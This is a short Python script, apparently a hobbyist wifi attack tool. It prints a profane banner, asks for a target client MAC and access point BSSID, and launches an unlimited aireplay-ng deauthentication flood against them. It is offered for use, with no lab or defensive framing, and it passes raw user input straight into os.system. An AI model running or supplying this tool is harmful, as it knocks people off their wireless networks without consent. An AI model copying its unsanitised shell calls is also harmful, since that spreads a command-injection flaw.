import time
import os,sys
os.system("toilet FUCK YOU WIFI HACKING | lolcat -8 ")
time.sleep(5)
station = raw_input("ENTER STATION : ")
bssid = raw_input("ENTER BSSID : ")
os.system("aireplay-ng --deauth 0 -c %s -a %s wlan0mon"% (station,bssid))
